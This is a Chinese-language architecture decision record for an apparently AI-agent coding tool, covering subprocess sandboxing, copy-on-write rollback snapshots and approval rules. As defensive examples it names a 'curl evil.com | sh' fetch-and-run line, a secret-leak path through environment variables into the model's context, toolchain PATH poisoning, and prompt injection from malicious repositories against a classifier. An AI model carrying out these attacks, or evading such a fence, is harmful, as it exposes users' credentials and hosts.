# ADR-0030: 采用运行期围栏与工作区快照替代静态命令证明

## 状态

Accepted (2026-08-24 全部落地. 决策 5 已按 Windows 出路修订, 决策 6 的删除清单随之执行)

## 日期

2026-08-21

## 背景

### 已有两份沙箱 ADR, 都没有落地

ADR-0014 与 ADR-0019 先后设计了跨平台隔离. 全库检索 `seatbelt` / `sandbox-exec` /
`bwrap` / `unshare` / `AppContainer` / `namespaces` 无任何命中,
`infrastructure/execution/environment_probe.py:63` 恒定返回 `IsolationLevel.NO_SANDBOX`.

ADR-0019 的状态写着 Accepted (2026-08-10 实现首个纵向切片), 但落地的是它后半份
"Shell 规范化配套变化", 前半份五条沙箱决策一行代码都没有. 一份 ADR 承担两件事,
后果是其中一件静默没做, 而状态栏看不出来.

### 静态证明因此独自承担了全部安全责任

ADR-0019 把静态分析定位成隔离层之外的另一道纵深. 隔离层没建, 纵深就变成了唯一那道.
当前 `security` 模块 8487 行, 其中约 4400 行 (52%) 服务于同一件事: **在命令执行之前,
从一个不透明的命令串里静态推导出它会做什么**.

| 子系统 | 行数 |
| --- | --- |
| Shell 解析 (tokens / parser / posix / cmd / powershell / command_plan / builtins) | 1560 |
| 命令语义表 (commands / wrappers) | 1220 |
| 脚本正文分析 (script_analyzer / script_patterns / script_facts) | 692 |
| 目标推导 (effects / expansion / arguments) | 365 |
| 可执行文件身份 (executable_binding / executable_resolver) | 299 |

这条路线有一个结构性的成本曲线: 精度只能靠加判据换, 而命令的世界是开放的.
2026-08-21 修复的 `find` 误判不是一次疏忽, 是这个模型必然会出现的一类错误 ---- `find` 因为**名字**在
`INDIRECT_EXECUTORS` 里就被判为动态执行, 而做同样目录遍历的 `ls -R` 与 `grep -r`
自动放行. 按名字猜行为, 就一定会有猜错的名字.

### 工作区内的兜底其实已经建好了

`application/recovery/coordinator.py:315`:

```python
if not plan.mutates_workspace:
    return SnapshotStrategy.NONE
if plan.target_resolution.closed and plan.effects.mutating_targets:
    return SnapshotStrategy.TARGETED
return SnapshotStrategy.FULL
```

**目标推不出来时走整棵工作区快照.** 而 `infrastructure/recovery/cow_snapshot_backend.py`
用 APFS `clonefile` 与 btrfs / XFS reflink 实现写时复制, 一份十万文件的快照占用磁盘接近零.

也就是说: 对"命令改坏了我的代码"这件事, ForgeCLI 已经有一道不需要知道命令做什么的
运行期防线. 缺的是另一个方向 ---- 宿主机与网络.

### 沙箱保护宿主机, 不保护工作区

这一点决定了本 ADR 的全部结构:

```
rm -rf /etc          在沙箱里 -> 被拦
curl evil.com | sh   在沙箱里 -> 被拦
rm -rf src/          在沙箱里 -> 执行成功
```

Agent 的工作 100% 发生在工作区内, 而沙箱的边界画在工作区外. 所以"实现沙箱就能删掉
静态分析"不成立 ---- 除非同时承认工作区内那一半由快照负责. 两道防线各管一个方向,
合起来才能把静态分析从安全路径上摘下来.

## 实测记录 (2026-08-21, 决策 8 第 1 步)

在写任何围栏代码之前先跑了决策 8 第 1 步要求的两项实测. **两项都是否定结果, 各推翻
了本 ADR 的一条具体主张.** 结论已经回填进下面的决策正文, 此处保留原始数据.

### 一. CoW 快照捕获耗时 ---- "一律 FULL"不成立

macOS 15 / APFS, `cp -Rc` (clonefile), 每档取三次最快值:

| 文件数 | 捕获耗时 |
| --- | --- |
| 100 | 10ms |
| 1,000 | 88ms |
| 5,000 | 403ms |
| 20,000 | 1,676ms |
| 50,000 | 4,184ms |

ForgeCLI 自身 8,038 个文件, 按曲线约 700ms 一次.

对照决策 8 第 1 步的判据表, 落在 "100ms ~ 1s" 与 "> 1s" 两档, **不落在 "< 100ms"**.
因此:

- **"一律 FULL, 删掉 565 行目标推导"这条路走不通.**
- 目标推导 (`arguments` / `expansion` / `effects` / `commands.py` 的写删移分类)
  **必须保留**, 但它的理由从"安全"变成"性能", 而且这个性能理由是硬的:
  封闭目标走 TARGETED 接近零, 封不住走 FULL 要 0.7 ~ 4 秒.
- `_MAX_FULL_FILES = 20_000` 这个既有上限对应约 1.7 秒, 位置是合理的.

### 二. Seatbelt 读边界 ---- allowlist 翻转在 macOS 上不成立

三种 profile 形态实测:

| profile | 结果 |
| --- | --- |
| `(deny default)` + 逐项 allow | 进程 SIGABRT (exit 134), 连 `/bin/sh` 都起不来 |
| `(allow default)` + `(deny file-read*)` + 系统目录 allowlist (`/usr` `/bin` `/sbin` `/System` `/Library` `/private/var/db/dyld` `/dev`) | 仍然 SIGABRT, `python3` 也起不来 |
| `(allow default)` + 定向 `deny` | **全部按预期工作** |

第三种形态的五项验证全过:

```text
围栏内写           成功
围栏外写           Operation not permitted, 文件未落地
受保护路径读       Operation not permitted
网络               curl exit 7
围栏内读           成功
```

所以 macOS 上**写边界可以是 allowlist, 读边界只能是 denylist**. 决策 4 里
"denylist 翻转成 allowlist, `protected_paths` 556 -> 150 行"那一条**对 macOS 不成立**,
凭证清单要原样保留, 并且继续处在"漏一条 = 凭证暴露"的风险方向.

Linux 的 bubblewrap 不受此限 ---- 它靠 mount namespace 逐项 bind, 本来就是 allowlist
语义. 这是一处必须记录的平台不对称: **同一条安全性质, 在 Linux 上由内核保证,
在 macOS 上仍然要靠一张需要追赶的表.**

## 落地记录 (2026-08-21, feat/security)

围栏已实现并端到端验证. 记三条实现期才浮出来的东西, 其中第一条**推翻了本 ADR 的一处
自相矛盾**.

### 一. 决策 5 与决策 6 互相矛盾, 决策 6 的删除清单执行不了

决策 6 要删掉脚本正文分析, 只读证明表, 提权表与间接执行递归预检; 决策 5 又要求原生
Windows 在没有围栏时**继续按今天的方式工作**. 这两条不能同时成立 ---- 被删掉的正是
Windows 唯一的依据.

实际落地方式: **这些代码保留, 但只在 `not confined` 时运行.**

```
有围栏 (macOS / Linux)  ->  跳过风险模式匹配, 分类器调用, 从正文推导能力
无围栏 (Windows)        ->  照旧全跑
```

于是行数不降反升 (8487 -> 8585, 加上围栏实现 696 行). 这正是本 ADR 自己在"影响"里
预言过的形态: **被条件跳过的代码比被删掉的代码更重, 因为它还得被测两遍.**

三个可选出路, 留给后续决策, 本次不选:

| | 做法 | 代价 |
| --- | --- | --- |
| A | Windows 也放弃静态分析, 跨栏一律 ASK | Windows 退回每条命令都点头 |
| B | 维持现状 (本次的选择) | 引擎不瘦身, 多一个平台维度 |
| C | 放弃原生 Windows shell, 要求 WSL2 | WSL2 有 bubblewrap, 但这是产品决策 |

**在这件事被决定之前, 决策 6 的行数表不成立.** 已按实测把它改成"条件跳过"而不是
"删除".

### 二. 有两样东西围栏替代不了, 决策 6 差点连它们一起删

- **脚本正文的内容哈希.** `learned_rules.py` 用它绑定学习规则. 少了它,
  `bash deploy.sh` 学到的永久放行只绑命令行那一串字, deploy.sh 随后改成什么都照样
  命中 ---- "一条永久放行 + 一个可自由改写的文件".
- **`FileStateBinding`** (ADR-0027 的执行前状态复核).

两者都不是"读正文找危险模式", 而是 TOCTOU 锚点. 落地时把它们与风险分析拆开: 前者
无条件做, 后者只在无围栏时做.

### 三. 围栏内自由的支点差点是空的

端到端验证 `rm -rf src/` 自动放行 + `/undo` 还原时发现: `_preimage_of` 对目录**只存
元数据哈希, 不存内容**. 于是目标封闭的 `rm -rf src/` 拿到 TARGETED checkpoint,
`restore` 报告成功并重建出一个**空目录**.

```
修复前  strategy=targeted  还原后 [README.md]                    完全一致 False
修复后  strategy=full      还原后 [README.md, src/a.py, src/b.py]  完全一致 True
```

这是既有缺陷, 不是本 ADR 引入的 ---- 但它以前被"删目录必须人工确认"挡着. 决策 4 让
围栏内的删除自动放行之后, 它变成一次静默的数据丢失, 而**围栏对此无能为力**: 那是
工作区内的操作, 边界画在工作区外.

教训写进判据: 决策 1 的两道防线里, "工作区内由快照兜底"这一条不是既成事实, 是一个
**需要逐条验证**的前提. 本 ADR 先前把它当成已经成立的东西来推导, 而它当时是漏的.

### 端到端验证结果

macOS 15, Seatbelt 自测三项全过, `isolation=host_confined`:

| 命令 | 模式 | 结果 |
| --- | --- | --- |
| `ls -la src` / `find . -name '*.py'` / `grep -rn print src` | auto | 自动执行 |
| `sed -i 's/1/2/' src/a.py` | auto | 自动执行 |
| `rm -rf src/` | auto | 自动执行, `/undo` 完整还原 |
| `echo x > <工作区外>` | auto | ASK, 且围栏外文件未落地 |
| `cat /etc/hosts` / `curl https://example.com` | auto | ASK |
| `git push` | **full_access** | ASK |
| `kill -9 <pid>` | auto | ASK |

## 决策

### 1. 安全由两道运行期防线保证, 不由静态证明保证

| | 工作区外 + 网络 | 工作区内 |
| --- | --- | --- |
| 防线 | 围栏 (运行期强制) | 写时复制快照 (执行前捕获) |
| 何时生效 | 子进程发起访问的那一刻 | 子进程启动之前 |
| 失败表现 | 系统调用被拒, 命令报错 | `/undo` 回滚 |
| 需要知道命令会做什么吗 | 不需要 | 不需要 |

静态分析退出安全路径, 保留两个新定位:

- 审批与执行结果的说明文字;
- 快照策略选择 (TARGETED 还是 FULL) 的性能优化.

**判定规则: 静态分析出错的后果必须只有"慢一点"或"说明不全", 不能是"该拦的没拦".**

这条规则是本 ADR 的验收核心. 它把 `find` 那一类误判从安全事故降级为一次多余的
全量快照 ---- 代价是几毫秒, 不是一次多余的人工确认, 更不是一次错误放行.

### 2. 不做临时可写工作区, 子进程直接写真实工作区

**明确废弃 ADR-0019 决策 4.** 三条理由:

1. **它会丢掉子进程生成的文件.** 原文写着"临时层中的测试产物不会自动 materialize
   到真实工作区"---- 这意味着 `npm install` 装的 `node_modules`, 编译输出, 覆盖率
   报告全部丢弃. 这不是安全机制, 是对开发流程的破坏.
2. **它是第二套恢复机制.** `ephemeral-sandbox:<policy_hash>` 与 ADR-0015 的
   RecoveryStore 回答同一个问题, ADR-0019 不得不再写一条规则防止两者串味
   ("直接文件写入不会借临时沙箱恢复绑定绕过 RecoveryStore"). 违反 ADR-0028 规则 B.
3. **写时复制快照已经提供同等语义且更好.** "扔掉就回滚"在 CoW 快照下同样成立,
   而子进程写的是真实工作区, 生成的文件保留.

连带作废:

- `domain/recovery/checkpoint.py` 的 `SnapshotStrategy.OVERLAY` (`available` 恒为
  `False`, 属 ADR-0028 规则 C 的无生产方枚举值);
- ADR-0015 §7.3 与 §8.3 中关于 OVERLAY 的两节.

### 3. 围栏只有两档, 且必须行为自测

保留 ADR-0019 决策 3 的自测设计 ---- 那是原 ADR 最好的部分: 不从配置里读取能力然后
声称拥有, 而是启动时真的去做一次被禁止的操作, 验证它确实失败.

但收缩枚举与自测内容:

```
IsolationLevel:  HOST_CONFINED | UNCONFINED
```

三档收到两档的理由有两条, 第二条是实测的:

1. ADR-0019 自己写明 Seatbelt 与 bubblewrap 都最多 Partial, `STRONG_SANDBOX`
   在任何平台都不可达.
2. **现有代码里唯一的行为消费方已经是二元的.** 全库检索
   `isolation_level` 只有一处影响执行路径:

   ```
   analyzers/script_analyzer.py:317
       return not context.profile.isolation_level.contained or facts.needs_classifier
   ```

   而 `IsolationLevel.contained` 的定义就是 `self is not NO_SANDBOX`.
   三档的区别只出现在给人和给模型看的文字里 ---- `runtime_facts.py:22-24` 的文案表,
   `classifier.py:120` 的提示词行, `system_prompt_builder.py:252` 的展示行.
   **没有任何一处按 Strong 与 Partial 的区别做出不同的行为.**

按 ADR-0028 规则 C 删除. 新枚举与既有的 `contained` 语义一一对应, 迁移是改名:
`HOST_CONFINED` = `contained`, `UNCONFINED` = `not contained`.

(此处同时纠正 ADR-0028 给 `IsolationLevel` 开的规则 C 例外. 当时的理由写的是"合并会让
探测不出来和确认无隔离变成同一个值", 但这三档里根本没有"探测不出来"这一档,
该例外的论证不成立. )

自测内容收缩到围栏真正承诺的三件事, 全部必须实测:

1. 工作区外的写入失败;
2. 受保护路径的**读取**失败 (见决策 4);
3. 对外网络连接失败.

进程隔离**不在这三项里**, 理由见决策 7.3 ---- Seatbelt 拿不到 PID namespace,
把它列为必要条件会让 macOS 永远 `UNCONFINED`.

任意一项不通过即 `UNCONFINED`. 不存在"部分隔离"---- 一个说不清自己拦得住什么的
围栏, 在裁决时只能当作没有.

自测结果与围栏策略哈希进入 `ExecutionProfile`, 画像变化使既有授权失效 (沿用 ADR-0027).

### 4. 围栏内自由, 跨栏 ASK; 受保护路径从"证明不碰"改为"碰不到"

裁决规则从命令语义表改为边界判断:

| 情形 | 裁决 | 由什么保证 |
| --- | --- | --- |
| 全部访问落在工作区内 | ALLOW | 快照可回滚 |
| 需要工作区外写入 / 网络 / 读受保护路径 | ASK | 围栏在运行期拦截 |
| Hard Deny 清单命中 | DENY | 静态前置拦截, 保留 |

关键性质: **跨栏是运行期发现的, 不是静态预测的.** 子进程撞栏 -> 系统调用被拒 ->
命令失败 -> `ShellTool` 返回结构化失败, 说明被拦下的具体对象 (围栏知道是哪个路径或
哪个地址, 不需要猜) -> 模型据此换做法, 或请求一次显式的会话资源扩张.

审批的粒度因此从"每条命令确认一次"变成"每次资源边界扩张确认一次". 后者次数少得多,
而且对用户更好解释 ---- "它想访问 `~/.ssh/id_rsa`"比"它执行了一条包含 `find` 的命令"
是更有用的信息.

半执行状态是可接受的, 因为两个方向都被盖住: 已经发生的工作区内写入由快照回滚, 试图
越界的部分根本没有发生. **失败即安全.**

#### 受保护路径: denylist 翻转成 allowlist

`ProtectedPathPolicy` 今天是 `analyzers/workspace_analyzer.py` 的判据, 用来静态推断
某条命令会不会读到凭证. 对**子进程**这条路径改为直接配置围栏 ---- 但**不是把同一张
denylist 搬过去**, 而是把默认规则反过来 (进程内工具那条路径见决策 7.4):

| | 今天 | 围栏之后 |
| --- | --- | --- |
| 规则 | 列举所有**不能碰**的路径 | 列举少数**可以碰**的路径 |
| 表的性质 | denylist, **开放集合** | allowlist, **有限集合** |
| 漏一条的后果 | 凭证暴露 | 某个工具启动失败 |

> **2026-08-21 实测修正: 这条对 macOS 不成立, 见"实测记录"第二节.**
>
> Seatbelt 下 `(deny default)` 与 `(deny file-read*)` + 系统 allowlist 两种形态都会让
> 子进程 SIGABRT ---- 连 `/bin/sh` 和 `python3` 都起不来. 能用的只有
> `(allow default)` + 定向 `deny`, 也就是**读边界只能是 denylist**.
>
> 因此上表只有**写边界**那一半成立. `ProtectedPathPolicy` 的凭证清单与发现逻辑
> **原样保留 556 行**, 并继续处在"漏一条 = 凭证暴露"的风险方向.
>
> Linux 的 bubblewrap 靠 mount namespace 逐项 bind, 本来就是 allowlist 语义, 不受
> 此限. 这是一处平台不对称: 同一条安全性质在 Linux 上由内核保证, 在 macOS 上仍然
> 要靠一张需要追赶的表.

写边界确实可以翻转: `(deny file-write*)` + `(allow file-write* (subpath 工作区))`
实测通过, 围栏外写入报 `Operation not permitted` 且文件不落地. 写方向不再需要
"证明这条命令不写工作区外".

#### 模式: 目录门在前, 围栏在后

先说清楚一件本 ADR **不改**的事: `application/tool_request/catalog_predicates.py`
的目录门. 它按 `spec.declared_capabilities` 决定模型**看得见哪些工具**, 在 plan 档
把带 `MUTATING_CAPABILITIES` 的工具整个移出 `ToolCatalog`:

| plan 档可见 | plan 档隐藏 |
| --- | --- |
| `fs.read_file`, `fs.list_files`, `fs.scan_tree`, `search.text`, `git.read`, 计划工具 | `fs.create_file`, `fs.edit_file`, `fs.delete`, `fs.create_directory`, `fs.move`, `shell.run` |

**目录门优于裁决门**, 三个层面上都是: 模型不会请求, 因而没有失败尝试, 也不消耗
上下文; 而且它完全不需要分析任何命令 ---- 判据是工具**自己声明的能力上界**, 静态,
一次读取.

这带出一个必须区分开的事实, 否则决策 6 的删除清单会误伤:

| | 来源 | 去留 |
| --- | --- | --- |
| `ToolSpec.declared_capabilities` | 工具自己声明的上界 | **保留**, 目录门用它 |
| 分析器从命令串推导出的 `Capability` 集合 | 静态证明 | **删除** |
| `domain/security/modes.py` 的 `auto_allowed_capabilities` 预算表 | 裁决层 | **删除**, 见下 |

其余三档不收窄目录 ---- 理由写在 `catalog_predicates.py:23`: "accept_edits 下让模型
看不见 shell.run, 它只会改用别的方式绕, 不如让它请求, 然后在裁决层给出明确的 ASK."

#### 裁决层: 模式编译成围栏策略

目录门放行之后, 模式的第二重作用今天是 `modes.py` 的能力预算, 而 `Capability` 要靠
分析器从命令里推导. 围栏之后模式直接编译成围栏策略:

| 模式 | 工作区 | 工作区外 | 网络 | 围栏外不可回滚操作 |
| --- | --- | --- | --- | --- |
| `plan` | 只读 | 只读 (allowlist) | 禁 | ASK |
| `accept_edits` | 读写 | 只读 (allowlist) | 禁 | ASK |
| `auto` | 读写 | 只读 (allowlist) | 禁 | ASK |
| `full_access` | 读写 | 只读 (allowlist) | 放行 | ASK |

`plan` 那一行主要是**兜底**, 不是主力: 模型看不见 `shell.run`, 正常路径下不会有子进程
在 plan 档里跑. 它防的是目录被绕过, 以及 MCP 与用户自定义工具**声明了一个不诚实的
能力上界**的情形 ---- 目录门信声明, 围栏不信.

`auto_allowed_capabilities` 与 `capabilities_requiring_approval` 随之消失.

这暴露出一个必须明说的结果: **`accept_edits` 与 `auto` 的安全边界在围栏下完全相同.**
今天两者的差别是 `EXECUTE_SHELL` / `EXECUTE_SCRIPT` 在不在预算里, 而那个差别之所以
存在, 是因为 Shell 不可分析因而可能伸得更远. 围栏之后它伸不远了 ---- `sed -i` 与
`fs.edit_file` 的影响范围完全一致.

两者保留为两档, 但**区分理由从"安全"改为"自主性"**: `accept_edits` 表示"可以改文件,
但起子进程要问我" ---- 那是关于用户愿不愿意让 Agent 自行消耗时间与 CPU 的偏好
(一次 40 分钟的测试, 一个 `while true`), 不是一个安全判断. 界面文案必须如实这么写,
不能继续暗示 `accept_edits` 比 `auto` 更安全.

### 5. Windows 优先经 WSL2 取得真围栏, 拿不到就显式降级

> **2026-08-24 修订.** 原文只写了"原生 Windows 无可用围栏, 一律 UNCONFINED", 那让
> 决策 6 的删除清单执行不了 ---- 被删的正是 Windows 唯一的依据 (见落地记录第一节).
> 现在分两级.

**第一级: 经 WSL2 借用 bubblewrap.** 原生 Windows 没有可用的围栏原语 ----
AppContainer 要求应用自带 manifest 与 SID, 不适用于"任意用户命令"; Job Object 管的是
资源不是文件系统边界. 所以不自己造, 而是把命令交给 WSL2 里的 bubblewrap: 那是 Linux
内核的 mount namespace, 与 Linux 上完全同一套保证, 连 PID namespace 一起拿到.

检测三件事, 全部实测: `wsl.exe` 存在, 列出的发行版里有 version **2** 的 (WSL1 没有
真内核), 且里面有可用的 `bwrap`.

代价要说清楚, **这不只是安全机制的变化**:

- 命令跑在 **Linux** 里. `python` / `node` / `git` 是 WSL 那一套, 不是 Windows 上的.
- 路径要翻译: `C:\Users\x\proj` -> `/mnt/c/Users/x/proj`.
- `.exe` 与 PowerShell 脚本在这条路径上跑不了.

这个取舍是明确的: **用一个真围栏换掉原生 Windows shell**, 而不是留着原生 shell 靠
静态分析假装安全.

**第二级: 拿不到就 `UNCONFINED`.**

- 工作区内: 照常. 快照仍然可用 ---- 但 NTFS 无 reflink, FULL 退回逐文件复制,
  由 ADR-0015 §10 的恢复预算决定是否拒绝执行. 这是真实的能力差异, 如实呈现.
- 工作区外 / 网络 / 起子进程: **一律 ASK**.

关键在于**这条路不需要任何命令知识**: `budget.py` 的 `_NEEDS_FENCE` 让
`EXECUTE_SHELL` 只在 `confined` 时进自动集合, 于是无围栏时每条 shell 命令必然超出
边界落 ASK ---- 静态分析根本不参与. 这就是决策 6 的删除清单能够执行的前提.

**不为 Windows 维护一套"用解析补偿没有围栏"的逻辑.** PowerShell 本身不可静态解析
(动态 cmdlet, 别名, script block), 继续加深解析只会得到一份看起来精确, 实际不可信的
说明.

能力差异写进 `RuntimeFacts` 让模型知道, 也在审批界面告诉用户.

**实现状态**: `Wsl2Provider` 已落地, 但**未在真实 Windows 上验证** (开发机是 macOS),
只有路径翻译与 argv 改写这些纯函数有测试覆盖. 这一点是可控的: `available()` 与
`self_test()` 任一不过就落回 `NoSandboxProvider`, 而那正是第二级 ---- 实现有错的后果是
"退回每条命令都问", 不是"以为有围栏而其实没有".

顺带记录另一个被否决的方向: 在 Windows 上改用 LLM 判断命令是否安全. 否决理由是
非确定性 (同一命令两次跑出不同结论, 审计无法回答当时为什么放行) 与提示词注入
(命令串由主模型产出, 而主模型读过仓库里的不可信内容, 一个恶意仓库可以让它产出带
说服载荷的命令串). 静态表不会被说服, 分类器会. ADR-0020 的 LLM 评估维持原定位:
只能收紧, 不能放行.

### 7. 围栏拦不住什么

围栏管的是**子进程**的文件系统与网络系统调用. 有四类东西落在它之外,
删掉现有机制会直接开洞.

#### 7.1 环境变量: 围栏看不见的通道

`exec` 那一刻环境块就已经在子进程的内存里. 读它不产生任何系统调用, 没有东西可以
拦截 ---- Seatbelt 与 bubblewrap 都不过滤环境变量.

泄露路径, 围栏一步都拦不住:

```text
AWS_SECRET_ACCESS_KEY 在环境里
  -> env > notes.txt      工作区内写, 围栏放行
  -> 模型读 notes.txt      工作区内读, 围栏放行
  -> 密钥进入模型上下文
  -> 出现在模型下一条输出里
```

围栏挡住了网络出口, 但**模型本身就是一个出口**.

挡住这条路的只有 `domain/execution/environment.py` 的 `sanitize_environment`,
而它已经是 allowlist 语义 ("allowlist 之外的变量一律不带入, 因此新出现的注入向量
默认被挡住"). **保留, 且在围栏之后比现在更承重.**

#### 7.2 受控 PATH: 让人工授权有意义

`environment.py` 的模块注释写着: 一个能写工作区的 Agent 只要往 `.envrc`,
`PYTHONPATH` 或 `node_modules/.bin` 里放点东西, 下一条"看起来安全"的命令就会执行
它写进去的代码.

围栏内这个攻击**照样成立** ---- 写工作区允许, 执行允许. 它不构成越权 (注入的代码
同样被围栏关着), 但它让**人工授权失去意义**: 用户批准"这次可以读
`~/.aws/credentials`", 真正跑起来的却是工作区里被替换掉的假 `aws`.

`trusted_path` 与 `writable_toolchain_path` 因此保留, 后者的存在理由 (PATH 里有
Agent 可写的工具链目录, 不能按系统二进制信任) 在围栏之后一字不变.

#### 7.3 围栏外不可回滚的操作: 唯一一张仍然承重的表

围栏能看见**发生了哪一类系统调用**, 看不见**后果**. 有两类操作因此漏网, 它们共同的
性质是: 后果落在围栏之外, 而工作区快照救不了.

**(a) 进程操作.** `kill`, `pkill`, `killall`, `systemctl`, `launchctl`, `shutdown`,
`reboot`, `docker stop / rm / kill` 既不写文件也不用网络. bubblewrap 可以开
PID namespace 把它们关在实例内; **Seatbelt 不能** ---- ADR-0019 自己写明
"Seatbelt 没有独立 PID namespace".

因此进程隔离**不作为 `HOST_CONFINED` 的必要条件** ---- 否则 macOS 永远
`UNCONFINED`, 整个设计在 macOS 上失效. 它是一个独立能力位, 拿不到 PID namespace
时靠表兜底.

**(b) 不可逆的外部操作.** `git push`, `npm publish`, `docker push`,
`gh release create`, `aws s3 rm`, `terraform apply`, `kubectl delete`.
在 `full_access` 下网络是放行的, 而围栏在 socket 层**无法区分 `git fetch` 与
`git push --force`** ---- 两者都只是一个到 github.com 的 TLS 连接.
ADR-0013 §4.1 要求这类操作在含 `full_access` 的所有模式下逐次 Mandatory Ask,
这条约束不能因为有了围栏就取消.

两类合成一张**围栏外不可回滚操作表**, 约 25 条, 是本 ADR 之后**唯一一张
"漏一条有害"的表**. 因此它单独立规矩:

- 必须小到可以一次审计完, 条目在实现时逐条写进 ADR 记录;
- 它是**风险方向**的表 (ADR-0028 规则 D): 命中即 ASK, 表外默认放行,
  所以每加一个条目都要说明后果为什么快照救不了;
- 它**不做参数级判断**. `git push` 与 `git status` 靠子命令区分, 但不去分辨
  `--force` 与普通 push ---- 那是精度换体量的老路.

#### 7.4 进程内工具: 围栏关不住 Forge 自己

围栏是**子进程**沙箱. 而 `fs.create_file`, `fs.edit_file`, `fs.delete`,
`fs.create_directory`, `fs.move` 是 Forge 进程内的 Python 调用 ----
`tools/builtin/fs_write.py:282` 是一次注入的 `self._write(path, content)`,
整个文件里没有一处 `subprocess`.

所以这些工具的边界检查**必须留在应用层**, 不能指望围栏. 这不是"我们选择早点问"的
风格取舍, 是结构上覆盖不到.

好在这条路径本来就便宜且精确: 路径是声明的入参 (`TargetResolution.STATIC`),
判定就是 `domain/workspace/boundary.py` 的 `is_within` ---- 不需要解析, 不需要推导,
不需要任何命令知识. 决策 6 删掉的是**从命令串推导目标**那一套, 不碰这条.

因此 `ProtectedPathPolicy` 有**两个**消费方, 不是决策 4 说的一个:

| 消费方 | 用途 | 需要什么 |
| --- | --- | --- |
| 围栏 (子进程) | deny-read / allowlist 边界 | 少数可读根, 有限集合 |
| 工作区授权上界 (进程内工具) | `application/security/workspace_grants.py`: 凭证与系统目录**不能被授权成工作区根** | 凭证子路径清单, 用于挡住 `~` 这类过宽的授权 |

第二个消费方让凭证清单不能删干净 ---- 但它的用途从"推断某条命令会不会读到凭证"
缩到"某个目录能不能被当成工作区根", 判定对象从开放的命令世界变成有限的授权请求.
556 -> 约 150 行的估计仍然成立, 删掉的是发现逻辑, 保留的是清单本身.

#### 7.5 冻结的内容变了, 冻结这个动作留下

`ExecutionProfile` 今天同时承担三件事, 去留不同:

| 用途 | 围栏之后 |
| --- | --- |
| 给静态分析一个确定的解释基准 (冻结的 `HOME` 供 `expand_home`, 冻结 cwd + 文件系统视图供 glob 展开) | **消失**, 与静态分析一起 |
| 控制子进程实际拿到什么 (`trusted_path`, `environment_allowlist`, `controlled_environment`, `writable_toolchain_path`, `shell_launch`) | **保留** (7.1 / 7.2) |
| 给授权做 TOCTOU 锚点 (`execution_profile_hash`, ADR-0027) | **保留**, 但锚定对象变成围栏策略, 且需要锚定的授权少得多 |

死掉的字段: `executable_resolution_version`, `path_normalization_version`,
`protected_roots_hash`.

### 8. 落地顺序: 先兜底, 后拆栏

顺序不能反, 每一步独立可回退:

1. **确认工作区内兜底真的成立, 并测出一个数.** 在目标平台实测
   `CowSnapshotBackend.available_for`, 并给 FULL 快照的捕获耗时加埋点, 按仓库文件数
   分档记录. 如果 CoW 在真实仓库上不可用, 后续全部不成立, 停在这里.

   这一步的埋点还决定决策 6 里 565 行的去留 ---- **一律 FULL 还是保留写 / 不写判断**:

   | 捕获耗时 (10 万文件仓库) | 结论 |
   | --- | --- |
   | < 100ms | **一律 FULL.** 删掉 `mutates_workspace`, `effect_kind_of`, `commands.py` 的写 / 删 / 移分类与目标推导 (共 565 行) |
   | 100ms ~ 1s | 保留最小的"这条命令写不写"判断作为纯性能优化, 表可以很粗 |
   | > 1s | 需要增量或按 turn 合并快照, 本 ADR 的成本模型要重估 |

   目标推导今天存在的唯一理由就是"避免不必要的全量快照". 如果捕获只要几十毫秒,
   这个优化不值得用 565 行表去换 ---- 而这不能靠推理, 只能靠测.
2. **实现围栏与行为自测** (决策 3), 但**先不改裁决**. 此时两道防线都在, 静态分析
   仍在原位 ---- 系统比现在更安全, 且没有任何回归风险.
3. **观测一段时间**: 记录围栏实际拦下了什么, 与静态分析当时的判断做对比.
   两者不一致的每一条都要看 ---- 那是设计假设出错的地方.
4. **确认一致后, 才按决策 6 删除.**

第 3 步不能跳过. 删掉静态分析是不可逆的, 而它是否真的多余, 只有把围栏跑起来才知道.

## 备选方案

- **方案 A: 按 ADR-0019 原样实现.** 沙箱作为静态分析之外的纵深, 两层都在.
  优点是不需要删任何现有代码, 风险最低. 缺点是安全引擎净增约 1000 行, 且原设计的
  临时可写工作区会丢掉子进程生成的文件 ---- 那是产品行为的破坏, 不是可以后续优化的
  性能问题. **否决.**
- **方案 B: 只删静态分析, 不做围栏.** 代码最轻. 但工作区外与网络方向完全失去保护,
  只剩 Hard Deny 那 257 行. **否决.**
- **方案 C: 在 Windows 上用 LLM 判断命令安全性, 替代静态证明.**
  见决策 5 的否决理由: 非确定性与提示词注入. **否决.**
- **方案 D: 维持现状, 继续在静态分析上加判据.** 每次误判修一条, 精度靠体量换.
  `find` 那次修复是这个模式的一个样本: 修得对, 但下一个命令名还会来. **否决.**
- **方案 E (本 ADR): 两道运行期防线, 静态分析退出安全路径.**

## 影响

### 收益

- 误判的**性质**改变: 从"该拦的没拦"或"不该问的问了"变成"快照多打一次".
- 命令表不再需要追赶命令的世界 ---- 表外的命令不再默认更危险, 只是快照更保守.
- ADR-0019 决策 4 丢掉子进程生成文件的问题消失: 子进程写的是真实工作区.
- 恢复层只有一套机制 (RecoveryStore), 不再需要规则去隔离两套.
- **`/undo` 顺带覆盖 git 写操作.** ADR-0015 有一节"已知限制: `/undo` 不覆盖
  `git.write`", 理由是 `.git/refs/heads/<branch>` 与 `packed-refs` 这些写入
  `prepare` 无法可靠枚举, 因此显式放弃并注明"需要单独一个切片".
  **FULL 快照不需要枚举** ---- 整棵工作区快照天然包含 `.git`, 于是
  `git commit` / `git reset --hard` / `git checkout` 变成可撤销的, 那个切片不用做了.
- 审批粒度从"每条命令"变成"每次资源边界扩张", 次数下降且信息量上升.
- 写边界对子进程翻转成 allowlist, 写方向不再需要证明命令不写工作区外.
  (读边界在 macOS 上仍是 denylist, 见实测记录第二节.)
- plan 档的目录门 (`catalog_predicates.py`) 完全不受影响, 且成为该模式的主要机制 ----
  模型看不见写工具与 `shell.run`, 不会请求, 也就没有失败尝试与上下文浪费.
- 模式变成围栏策略, `auto_allowed_capabilities` 那套能力推导消失.
- 安全引擎 8487 -> 7550, 加围栏 846 行, 净 8396 (下降 1%). **收益不在行数**:
  删掉的全部在安全路径上, 新增的是运行期强制; 仍在安全路径上的命令表只剩一张.

### 代价

- **跨栏在运行期才发现**, 命令可能已经执行了一部分. 由快照兜住 (决策 4).
- **Windows 体验劣化**: 无围栏, 跨栏操作一律 ASK, 且 FULL 快照无 CoW 加速.
- **每条会写的 Shell 命令前多一次快照**. CoW 下接近零, 但 inode 消耗真实存在,
  依赖 ADR-0015 的 `retention_seconds` 清理.
- **审批界面信息变化**: 不再展示静态推导的目标清单, 改为展示围栏实际拦下的对象.
  对"要不要放它出围栏"更有用, 对"它会改我哪些文件"不如从前 ---- 后者由 `/undo`
  的存在来补偿.
